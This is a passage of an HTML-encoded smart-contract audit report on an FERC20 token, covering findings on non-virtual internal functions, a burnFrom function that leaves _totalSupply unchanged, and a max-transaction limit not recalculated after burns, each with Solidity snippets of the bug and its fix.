include:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eInternal hooks for token operations\u003c/li\u003e\n\u003cli\u003eState modification functions\u003c/li\u003e\n\u003cli\u003eValidation functions\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"impact-22\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-22\" aria-label=\"impact 22 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eReduced code reusability.\u003c/li\u003e\n\u003cli\u003ePotential code duplication in derived contracts.\u003c/li\u003e\n\u003cli\u003eIncreased maintenance burden when changes are needed.\u003c/li\u003e\n\u003cli\u003eRisk of bugs when developers are forced to copy and modify code instead of properly inheriting.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-39\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-39\" aria-label=\"recommended mitigation steps 39 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eAudit internal functions and mark appropriate ones as \u003ccode\u003evirtual\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eAdd proper documentation for overrideable functions.\u003c/li\u003e\n\u003cli\u003eConsider creating explicit hooks for key operations.\u003c/li\u003e\n\u003cli\u003eFollow the Open-Closed Principle: design for extension.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2 id=\"10-totalsupply-not-updated-on-burning-in-ferc20\" style=\"position:relative;\"\u003e\u003ca href=\"#10-totalsupply-not-updated-on-burning-in-ferc20\" aria-label=\"10 totalsupply not updated on burning in ferc20 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[10] \u003ccode\u003etotalSupply\u003c/code\u003e not updated on burning in \u003ccode\u003eFERC20\u003c/code\u003e\u003c/h2\u003e\n\u003cp\u003eThe \u003ccode\u003eFERC20\u003c/code\u003e contract’s \u003ccode\u003eburnFrom\u003c/code\u003e function reduces the user’s balance but does not decrease \u003ccode\u003e_totalSupply\u003c/code\u003e. This breaks ERC20 compliance and causes \u003ccode\u003etotalSupply()\u003c/code\u003e to report incorrect values after burns.\u003c/p\u003e\n\u003cp\u003eThe root cause is in the \u003ccode\u003eburnFrom\u003c/code\u003e function implementation:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"144\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Invalid address\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis function only modifies the user’s balance but fails to update the \u003ccode\u003etotalSupply\u003c/code\u003e, unlike standard ERC20 implementations where burning tokens should reduce both the user’s balance and the \u003ccode\u003etotalSupply\u003c/code\u003e.\u003c/p\u003e\n\u003ch3 id=\"impact-23\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-23\" aria-label=\"impact 23 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eInaccurate token economics: the reported \u003ccode\u003etotalSupply\u003c/code\u003e will be higher than the actual circulating supply.\u003c/li\u003e\n\u003cli\u003eExternal systems relying on correct supply data will malfunction.\u003c/li\u003e\n\u003cli\u003ePotential price manipulation: artificially inflated supply metrics could affect token valuation.\u003c/li\u003e\n\u003cli\u003eBroken integrations: systems that rely on the total supply for calculations (e.g., voting power, rewards) will use incorrect values.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-40\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-40\" aria-label=\"recommended mitigation steps 40 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eUpdate the \u003ccode\u003eburnFrom\u003c/code\u003e function to decrease the \u003ccode\u003e_totalSupply\u003c/code\u003e when burning tokens:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"145\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Invalid address\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Add this line to update total supply\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAdditionally, consider using the internal \u003ccode\u003e_burn\u003c/code\u003e function that already exists in the contract to avoid code duplication:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"146\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_burn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAnd update the \u003ccode\u003e_burn\u003c/code\u003e function to also decrease the \u003ccode\u003etotalSupply\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"147\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_burn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Invalid address\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balances\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Add this line\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2 id=\"11-wrong-max-transaction-limit-after-burns\" style=\"position:relative;\"\u003e\u003ca href=\"#11-wrong-max-transaction-limit-after-burns\" aria-label=\"11 wrong max transaction limit after burns permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[11] Wrong max transaction limit after burns\u003c/h2\u003e\n\u003cp\u003eThe \u003ccode\u003eFERC20\u003c/code\u003e contract’s \u003ccode\u003e_maxTxAmount\u003c/code\u003e is calculated based on the initial \u003ccode\u003e_totalSupply\u003c/code\u003e and is not updated when tokens are burned. This issue is compounded by the previously reported bug where \u003ccode\u003e_totalSupply\u003c/code\u003e is not decreased during burns. Even if the total supply bug is fixed, the max transaction limit would still need to be recalculated after burns.\u003c/p\u003e\n\u003cp\u003eThe root cause is in the \u003ccode\u003e_updateMaxTx\u003c/code\u003e function, which is only called at deployment and when explicitly invoked:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"148\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_updateMaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTxAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emaxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eMaxTxUpdated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maxTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis function is not called after burns, so \u003ccode\u003e_maxTxAmount\u003c/code\u003e remains tied to the original (higher) supply, allowing disproportionately large transfers relative to the actual circulating supply.\u003c/p\u003e\n\u003ch3 id=\"impact-24\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-24\" aria-label=\"impact 24 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eIncorrect enforcement of transaction limits, undermining tokenomics.\u003c/li\u003e\n\u003cli\u003eAnti-whale mechanisms become ineffective after burns.\u003c/li\u003e\n\u003cli\u003eUsers can transfer larger percentages of the circulating supply than intended (up to 2x the intended percentage after 50% of supply is burned).\u003c/li\u003e\n\u003cli\u003ePotential market manipulation through unexpectedly large trades.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 